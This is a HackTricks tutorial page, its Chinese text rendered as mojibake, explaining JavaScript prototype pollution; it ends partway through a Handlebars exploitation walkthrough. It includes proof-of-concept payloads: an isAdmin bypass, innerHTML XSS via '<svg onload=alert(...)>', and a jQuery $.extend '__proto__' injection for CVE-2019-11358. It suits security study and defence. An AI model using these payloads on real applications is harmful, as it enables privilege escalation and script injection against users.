<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>NodeJS - __proto__ &amp; prototype Pollution</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">
        <link rel="stylesheet" href="../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="nodejs---__proto__--prototype-pollution"><a class="header" href="#nodejs---__proto__--prototype-pollution">NodeJS - __proto__ &amp; prototype Pollution</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<h2 id="javascript-ä¸­çš„å¯¹è±¡"><a class="header" href="#javascript-ä¸­çš„å¯¹è±¡">JavaScript ä¸­çš„å¯¹è±¡ <a href="#id-053a" id="id-053a"></a></a></h2>
<p>JavaScript ä¸­çš„å¯¹è±¡æœ¬è´¨ä¸Šæ˜¯é”®å€¼å¯¹çš„é›†åˆï¼Œç§°ä¸ºå±æ€§ã€‚å¯ä»¥ä½¿ç”¨ <code>Object.create</code> å¹¶å°† <code>null</code> ä½œä¸ºå‚æ•°æ¥åˆ›å»ºä¸€ä¸ªç©ºå¯¹è±¡ã€‚æ­¤æ–¹æ³•å…è®¸åˆ›å»ºä¸€ä¸ªæ²¡æœ‰ä»»ä½•ç»§æ‰¿å±æ€§çš„å¯¹è±¡ã€‚</p>
<pre><code class="language-javascript">// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
</code></pre>
<p>ä¸€ä¸ªç©ºå¯¹è±¡ç±»ä¼¼äºä¸€ä¸ªç©ºå­—å…¸ï¼Œè¡¨ç¤ºä¸º<code>{}</code>ã€‚</p>
<h3 id="javascriptä¸­çš„å‡½æ•°å’Œç±»"><a class="header" href="#javascriptä¸­çš„å‡½æ•°å’Œç±»">JavaScriptä¸­çš„å‡½æ•°å’Œç±»</a></h3>
<p>åœ¨JavaScriptä¸­ï¼Œç±»å’Œå‡½æ•°å¯†åˆ‡ç›¸å…³ï¼Œå‡½æ•°é€šå¸¸ä½œä¸ºç±»çš„æ„é€ å‡½æ•°ã€‚å°½ç®¡JavaScriptç¼ºä¹åŸç”Ÿç±»æ”¯æŒï¼Œä½†æ„é€ å‡½æ•°å¯ä»¥æ¨¡æ‹Ÿç±»çš„è¡Œä¸ºã€‚</p>
<pre><code class="language-javascript">// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
</code></pre>
<h3 id="prototypes-in-javascript"><a class="header" href="#prototypes-in-javascript">Prototypes in JavaScript</a></h3>
<p>JavaScript å…è®¸åœ¨è¿è¡Œæ—¶ä¿®æ”¹ã€æ·»åŠ æˆ–åˆ é™¤åŸå‹å±æ€§ã€‚è¿™ç§çµæ´»æ€§ä½¿å¾—ç±»åŠŸèƒ½çš„åŠ¨æ€æ‰©å±•æˆä¸ºå¯èƒ½ã€‚</p>
<p>åƒ <code>toString</code> å’Œ <code>valueOf</code> è¿™æ ·çš„å‡½æ•°å¯ä»¥è¢«æ”¹å˜ä»¥æ”¹å˜å®ƒä»¬çš„è¡Œä¸ºï¼Œå±•ç¤ºäº† JavaScript åŸå‹ç³»ç»Ÿçš„é€‚åº”æ€§ã€‚</p>
<h2 id="inheritance"><a class="header" href="#inheritance">Inheritance</a></h2>
<p>åœ¨åŸºäºåŸå‹çš„ç¼–ç¨‹ä¸­ï¼Œå±æ€§/æ–¹æ³•ç”±å¯¹è±¡ä»ç±»ä¸­ç»§æ‰¿ã€‚è¿™äº›ç±»æ˜¯é€šè¿‡å°†å±æ€§/æ–¹æ³•æ·»åŠ åˆ°å¦ä¸€ä¸ªç±»çš„å®ä¾‹æˆ–ä¸€ä¸ªç©ºå¯¹è±¡æ¥åˆ›å»ºçš„ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“ä¸€ä¸ªå±æ€§è¢«æ·»åŠ åˆ°ä½œä¸ºå…¶ä»–å¯¹è±¡åŸå‹çš„å¯¹è±¡ï¼ˆä¾‹å¦‚ <code>myPersonObj</code>ï¼‰æ—¶ï¼Œç»§æ‰¿çš„å¯¹è±¡å¯ä»¥è®¿é—®è¿™ä¸ªæ–°å±æ€§ã€‚ç„¶è€Œï¼Œé™¤éæ˜ç¡®è°ƒç”¨ï¼Œå¦åˆ™è¿™ä¸ªå±æ€§ä¸ä¼šè‡ªåŠ¨æ˜¾ç¤ºã€‚</p>
<h2 id="__proto__-pollution"><a class="header" href="#__proto__-pollution">__proto__ pollution <a href="#id-0d0a" id="id-0d0a"></a></a></h2>
<h2 id="exploring-prototype-pollution-in-javascript"><a class="header" href="#exploring-prototype-pollution-in-javascript">Exploring Prototype Pollution in JavaScript</a></h2>
<p>JavaScript å¯¹è±¡ç”±é”®å€¼å¯¹å®šä¹‰ï¼Œå¹¶ä» JavaScript å¯¹è±¡åŸå‹ç»§æ‰¿ã€‚è¿™æ„å‘³ç€æ”¹å˜å¯¹è±¡åŸå‹å¯ä»¥å½±å“ç¯å¢ƒä¸­çš„æ‰€æœ‰å¯¹è±¡ã€‚</p>
<p>è®©æˆ‘ä»¬ç”¨ä¸€ä¸ªä¸åŒçš„ä¾‹å­æ¥è¯´æ˜ï¼š</p>
<pre><code class="language-javascript">function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
</code></pre>
<p>é€šè¿‡ä»¥ä¸‹æ–¹å¼å¯ä»¥è®¿é—® Object åŸå‹ï¼š</p>
<pre><code class="language-javascript">car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
</code></pre>
<p>é€šè¿‡å‘ Object åŸå‹æ·»åŠ å±æ€§ï¼Œæ¯ä¸ª JavaScript å¯¹è±¡å°†ç»§æ‰¿è¿™äº›æ–°å±æ€§ï¼š</p>
<pre><code class="language-javascript">function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
</code></pre>
<h2 id="prototype-pollution"><a class="header" href="#prototype-pollution">prototype pollution</a></h2>
<p>å¯¹äº<code>__proto__</code>ä½¿ç”¨å—åˆ°é™åˆ¶çš„åœºæ™¯ï¼Œä¿®æ”¹å‡½æ•°çš„åŸå‹æ˜¯ä¸€ä¸ªæ›¿ä»£æ–¹æ¡ˆï¼š</p>
<pre><code class="language-javascript">function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
</code></pre>
<p>è¿™ä»…å½±å“ä» <code>Vehicle</code> æ„é€ å‡½æ•°åˆ›å»ºçš„å¯¹è±¡ï¼Œä½¿å®ƒä»¬å…·æœ‰ <code>beep</code>ã€<code>hasWheels</code>ã€<code>honk</code> å’Œ <code>isElectric</code> å±æ€§ã€‚</p>
<p>é€šè¿‡åŸå‹æ±¡æŸ“å…¨å±€å½±å“ JavaScript å¯¹è±¡çš„ä¸¤ç§æ–¹æ³•åŒ…æ‹¬ï¼š</p>
<ol>
<li>ç›´æ¥æ±¡æŸ“ <code>Object.prototype</code>ï¼š</li>
</ol>
<pre><code class="language-javascript">Object.prototype.goodbye = function() { console.log("Goodbye!"); };
</code></pre>
<ol start="2">
<li>æ±¡æŸ“å¸¸ç”¨ç»“æ„çš„æ„é€ å‡½æ•°åŸå‹ï¼š</li>
</ol>
<pre><code class="language-javascript">var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
</code></pre>
<p>åœ¨è¿™äº›æ“ä½œä¹‹åï¼Œæ¯ä¸ª JavaScript å¯¹è±¡éƒ½å¯ä»¥æ‰§è¡Œ <code>goodbye</code> å’Œ <code>greet</code> æ–¹æ³•ã€‚</p>
<h2 id="æ±¡æŸ“å…¶ä»–å¯¹è±¡"><a class="header" href="#æ±¡æŸ“å…¶ä»–å¯¹è±¡">æ±¡æŸ“å…¶ä»–å¯¹è±¡</a></h2>
<h3 id="ä»ç±»åˆ°-objectprototype"><a class="header" href="#ä»ç±»åˆ°-objectprototype">ä»ç±»åˆ° Object.prototype</a></h3>
<p>åœ¨ä¸€ä¸ªå¯ä»¥<strong>æ±¡æŸ“ç‰¹å®šå¯¹è±¡</strong>çš„åœºæ™¯ä¸­ï¼Œå¦‚æœä½ éœ€è¦<strong>åˆ°è¾¾ <code>Object.prototype</code></strong>ï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç è¿›è¡Œæœç´¢ï¼š</p>
<pre><code class="language-javascript">// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
</code></pre>
<h3 id="æ•°ç»„å…ƒç´ æ±¡æŸ“"><a class="header" href="#æ•°ç»„å…ƒç´ æ±¡æŸ“">æ•°ç»„å…ƒç´ æ±¡æŸ“</a></h3>
<p>æ³¨æ„ï¼Œç”±äºæ‚¨å¯ä»¥æ±¡æŸ“ JS ä¸­å¯¹è±¡çš„å±æ€§ï¼Œå¦‚æœæ‚¨æœ‰æƒæ±¡æŸ“æ•°ç»„ï¼Œæ‚¨ä¹Ÿå¯ä»¥é€šè¿‡ <strong>ç´¢å¼•</strong> æ±¡æŸ“ <strong>æ•°ç»„çš„å€¼</strong>ï¼ˆè¯·æ³¨æ„ï¼Œæ‚¨æ— æ³•è¦†ç›–å€¼ï¼Œå› æ­¤æ‚¨éœ€è¦æ±¡æŸ“ä»¥æŸç§æ–¹å¼ä½¿ç”¨ä½†æœªè¢«å†™å…¥çš„ç´¢å¼•ï¼‰ã€‚</p>
<pre><code class="language-javascript">c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
</code></pre>
<h3 id="html-elements-pollution"><a class="header" href="#html-elements-pollution">Html elements pollution</a></h3>
<p>é€šè¿‡ JS ç”Ÿæˆ HTML å…ƒç´ æ—¶ï¼Œå¯ä»¥ <strong>è¦†ç›–</strong> <strong><code>innerHTML</code></strong> å±æ€§ï¼Œä½¿å…¶å†™å…¥ <strong>ä»»æ„ HTML ä»£ç ã€‚</strong> <a href="https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/">è¿™ä¸ªå†™ä½œçš„æƒ³æ³•å’Œç¤ºä¾‹</a>.</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-javascript">// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=&lt;"svg onload=alert(1)&gt;"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="&lt;svg onload=alert(document.domain)&gt;"
</code></pre>
<p>{% endcode %}</p>
<h2 id="ç¤ºä¾‹"><a class="header" href="#ç¤ºä¾‹">ç¤ºä¾‹</a></h2>
<h3 id="åŸºæœ¬ç¤ºä¾‹"><a class="header" href="#åŸºæœ¬ç¤ºä¾‹">åŸºæœ¬ç¤ºä¾‹</a></h3>
<p>åŸå‹æ±¡æŸ“æ˜¯ç”±äºåº”ç”¨ç¨‹åºä¸­çš„ç¼ºé™·å¯¼è‡´çš„ï¼Œè¯¥ç¼ºé™·å…è®¸è¦†ç›– <code>Object.prototype</code> ä¸Šçš„å±æ€§ã€‚è¿™æ„å‘³ç€å¤§å¤šæ•°å¯¹è±¡ä» <code>Object.prototype</code> æ´¾ç”Ÿå…¶å±æ€§ã€‚</p>
<p>æœ€ç®€å•çš„ç¤ºä¾‹æ˜¯å‘ä¸€ä¸ª<strong>æœªå®šä¹‰å±æ€§çš„å¯¹è±¡</strong>æ·»åŠ ä¸€ä¸ªå€¼ï¼Œè¯¥å¯¹è±¡å°†è¢«æ£€æŸ¥ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="language-javascript">if (user.admin) {
</code></pre>
<p>å¦‚æœå±æ€§ <strong><code>admin</code> æœªå®šä¹‰</strong>ï¼Œåˆ™å¯ä»¥åˆ©ç”¨ PP å¹¶å°†å…¶è®¾ç½®ä¸º Trueï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="language-javascript">Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
</code></pre>
<p>è¯¥æœºåˆ¶æ¶‰åŠæ“çºµå±æ€§ï¼Œä»¥ä¾¿å¦‚æœæ”»å‡»è€…æ§åˆ¶æŸäº›è¾“å…¥ï¼Œä»–ä»¬å¯ä»¥ä¿®æ”¹åº”ç”¨ç¨‹åºä¸­æ‰€æœ‰å¯¹è±¡çš„åŸå‹ã€‚è¿™ç§æ“çºµé€šå¸¸æ¶‰åŠè®¾ç½® <code>__proto__</code> å±æ€§ï¼Œåœ¨ JavaScript ä¸­ï¼Œè¿™ä¸ç›´æ¥ä¿®æ”¹å¯¹è±¡çš„åŸå‹åŒä¹‰ã€‚</p>
<p>æˆåŠŸæ‰§è¡Œæ­¤æ”»å‡»çš„æ¡ä»¶ï¼Œå¦‚ç‰¹å®š <a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf">ç ”ç©¶</a> ä¸­æ‰€è¿°ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>æ‰§è¡Œé€’å½’åˆå¹¶ã€‚</li>
<li>æ ¹æ®è·¯å¾„å®šä¹‰å±æ€§ã€‚</li>
<li>å…‹éš†å¯¹è±¡ã€‚</li>
</ul>
<h3 id="override-function"><a class="header" href="#override-function">Override function</a></h3>
<pre><code class="language-python">customer.__proto__.toString = ()=&gt;{alert("polluted")}
</code></pre>
<h3 id="åŸå‹æ±¡æŸ“åˆ°-rce"><a class="header" href="#åŸå‹æ±¡æŸ“åˆ°-rce">åŸå‹æ±¡æŸ“åˆ° RCE</a></h3>
<p>{% content-ref url="prototype-pollution-to-rce.md" %}
<a href="prototype-pollution-to-rce.html">prototype-pollution-to-rce.md</a>
{% endcontent-ref %}</p>
<p>å…¶ä»–æœ‰æ•ˆè½½è·ï¼š</p>
<ul>
<li><a href="https://github.com/KTH-LangSec/server-side-prototype-pollution">https://github.com/KTH-LangSec/server-side-prototype-pollution</a></li>
</ul>
<h2 id="å®¢æˆ·ç«¯åŸå‹æ±¡æŸ“åˆ°-xss"><a class="header" href="#å®¢æˆ·ç«¯åŸå‹æ±¡æŸ“åˆ°-xss">å®¢æˆ·ç«¯åŸå‹æ±¡æŸ“åˆ° XSS</a></h2>
<p>{% content-ref url="client-side-prototype-pollution.md" %}
<a href="client-side-prototype-pollution.html">client-side-prototype-pollution.md</a>
{% endcontent-ref %}</p>
<h3 id="cve-201911358é€šè¿‡-jquery--extend-çš„åŸå‹æ±¡æŸ“æ”»å‡»"><a class="header" href="#cve-201911358é€šè¿‡-jquery--extend-çš„åŸå‹æ±¡æŸ“æ”»å‡»">CVE-2019â€“11358ï¼šé€šè¿‡ jQuery $ .extend çš„åŸå‹æ±¡æŸ“æ”»å‡»</a></h3>
<p><a href="https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7">æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹æœ¬æ–‡</a> åœ¨ jQuery ä¸­ï¼Œ<code>$ .extend</code> å‡½æ•°å¦‚æœæ·±æ‹·è´åŠŸèƒ½ä½¿ç”¨ä¸å½“ï¼Œå¯èƒ½å¯¼è‡´åŸå‹æ±¡æŸ“ã€‚æ­¤å‡½æ•°é€šå¸¸ç”¨äºå…‹éš†å¯¹è±¡æˆ–åˆå¹¶é»˜è®¤å¯¹è±¡çš„å±æ€§ã€‚ç„¶è€Œï¼Œå½“é…ç½®é”™è¯¯æ—¶ï¼ŒåŸæœ¬ç”¨äºæ–°å¯¹è±¡çš„å±æ€§å¯èƒ½ä¼šè¢«åˆ†é…ç»™åŸå‹ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="language-javascript">$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
</code></pre>
<p>è¿™ä¸ªæ¼æ´è¢«è¯†åˆ«ä¸º CVE-2019â€“11358ï¼Œè¯´æ˜æ·±æ‹·è´å¦‚ä½•æ— æ„ä¸­ä¿®æ”¹åŸå‹ï¼Œä»è€Œå¯¼è‡´æ½œåœ¨çš„å®‰å…¨é£é™©ï¼Œä¾‹å¦‚å¦‚æœåƒ <code>isAdmin</code> è¿™æ ·çš„å±æ€§åœ¨æ²¡æœ‰é€‚å½“å­˜åœ¨éªŒè¯çš„æƒ…å†µä¸‹è¢«æ£€æŸ¥ï¼Œå¯èƒ½ä¼šå¯¼è‡´æœªç»æˆæƒçš„ç®¡ç†å‘˜è®¿é—®ã€‚</p>
<h3 id="cve-20183721-cve-201910744-é€šè¿‡-lodash-çš„åŸå‹æ±¡æŸ“æ”»å‡»"><a class="header" href="#cve-20183721-cve-201910744-é€šè¿‡-lodash-çš„åŸå‹æ±¡æŸ“æ”»å‡»">CVE-2018â€“3721, CVE-2019â€“10744: é€šè¿‡ lodash çš„åŸå‹æ±¡æŸ“æ”»å‡»</a></h3>
<p><a href="https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7">æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹è¿™ç¯‡æ–‡ç« </a></p>
<p><a href="https://www.npmjs.com/package/lodash">Lodash</a> é‡åˆ°äº†ç±»ä¼¼çš„åŸå‹æ±¡æŸ“æ¼æ´ (CVE-2018â€“3721, CVE-2019â€“10744)ã€‚è¿™äº›é—®é¢˜åœ¨ç‰ˆæœ¬ 4.17.11 ä¸­å¾—åˆ°äº†ä¿®å¤ã€‚</p>
<h3 id="å¦ä¸€ä¸ªåŒ…å«-cve-çš„æ•™ç¨‹"><a class="header" href="#å¦ä¸€ä¸ªåŒ…å«-cve-çš„æ•™ç¨‹">å¦ä¸€ä¸ªåŒ…å« CVE çš„æ•™ç¨‹</a></h3>
<p>{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}</p>
<h3 id="æ£€æµ‹åŸå‹æ±¡æŸ“çš„å·¥å…·"><a class="header" href="#æ£€æµ‹åŸå‹æ±¡æŸ“çš„å·¥å…·">æ£€æµ‹åŸå‹æ±¡æŸ“çš„å·¥å…·</a></h3>
<ul>
<li><a href="https://github.com/doyensec/Server-Side-Prototype-Pollution-Gadgets-Scanner"><strong>Server-Side-Prototype-Pollution-Gadgets-Scanner</strong></a>: Burp Suite æ‰©å±•ï¼Œæ—¨åœ¨æ£€æµ‹å’Œåˆ†æ Web åº”ç”¨ç¨‹åºä¸­çš„æœåŠ¡å™¨ç«¯åŸå‹æ±¡æŸ“æ¼æ´ã€‚è¯¥å·¥å…·è‡ªåŠ¨åŒ–æ‰«æè¯·æ±‚çš„è¿‡ç¨‹ï¼Œä»¥è¯†åˆ«æ½œåœ¨çš„åŸå‹æ±¡æŸ“é—®é¢˜ã€‚å®ƒåˆ©ç”¨å·²çŸ¥çš„å·¥å…· - åˆ©ç”¨åŸå‹æ±¡æŸ“æ‰§è¡Œæœ‰å®³æ“ä½œçš„æ–¹æ³• - ç‰¹åˆ«å…³æ³¨ Node.js åº“ã€‚</li>
<li><a href="https://github.com/portswigger/server-side-prototype-pollution"><strong>server-side-prototype-pollution</strong></a>: è¯¥æ‰©å±•è¯†åˆ«æœåŠ¡å™¨ç«¯åŸå‹æ±¡æŸ“æ¼æ´ã€‚å®ƒä½¿ç”¨åœ¨ <a href="https://portswigger.net/research/server-side-prototype-pollution">server side prototype pollution</a> ä¸­æè¿°çš„æŠ€æœ¯ã€‚</li>
</ul>
<h3 id="nodejs-ä¸­çš„-ast-åŸå‹æ±¡æŸ“"><a class="header" href="#nodejs-ä¸­çš„-ast-åŸå‹æ±¡æŸ“">NodeJS ä¸­çš„ AST åŸå‹æ±¡æŸ“</a></h3>
<p>NodeJS åœ¨ JavaScript ä¸­å¹¿æ³›ä½¿ç”¨æŠ½è±¡è¯­æ³•æ ‘ (AST) è¿›è¡Œæ¨¡æ¿å¼•æ“å’Œ TypeScript ç­‰åŠŸèƒ½ã€‚æœ¬èŠ‚æ¢è®¨ä¸æ¨¡æ¿å¼•æ“ä¸­åŸå‹æ±¡æŸ“ç›¸å…³çš„æ¼æ´ï¼Œç‰¹åˆ«æ˜¯ Handlebars å’Œ Pugã€‚</p>
<h4 id="handlebars-æ¼æ´åˆ†æ"><a class="header" href="#handlebars-æ¼æ´åˆ†æ">Handlebars æ¼æ´åˆ†æ</a></h4>
<p>Handlebars æ¨¡æ¿å¼•æ“æ˜“å—åŸå‹æ±¡æŸ“æ”»å‡»ã€‚è¯¥æ¼æ´æºäº <code>javascript-compiler.js</code> æ–‡ä»¶ä¸­çš„ç‰¹å®šå‡½æ•°ã€‚ä¾‹å¦‚ï¼Œ<code>appendContent</code> å‡½æ•°åœ¨å­˜åœ¨æ—¶ä¼šè¿æ¥ <code>pendingContent</code>ï¼Œè€Œ <code>pushSource</code> å‡½æ•°åœ¨æ·»åŠ æºåå°† <code>pendingContent</code> é‡ç½®ä¸º <code>undefined</code>ã€‚</p>
<p><strong>åˆ©ç”¨è¿‡ç¨‹</strong></p>
<p>åˆ©ç”¨ Handlebars ç”Ÿæˆçš„ ASTï¼ˆæŠ½è±¡è¯­æ³•æ ‘ï¼‰ï¼Œéµå¾ªä»¥ä¸‹æ­¥éª¤ï¼š</p>
<ol>
<li><strong>è§£æå™¨çš„æ“æ§</strong>ï¼šæœ€åˆï¼Œè§£æå™¨é€šè¿‡ <code>NumberLiteral</code> èŠ‚ç‚¹å¼ºåˆ¶å€¼ä¸ºæ•°å­—ã€‚åŸå‹æ±¡æŸ“å¯ä»¥è§„é¿è¿™ä¸€ç‚¹ï¼Œä»è€Œå…è®¸æ’å…¥éæ•°å­—å­—ç¬¦ä¸²ã€‚</li>
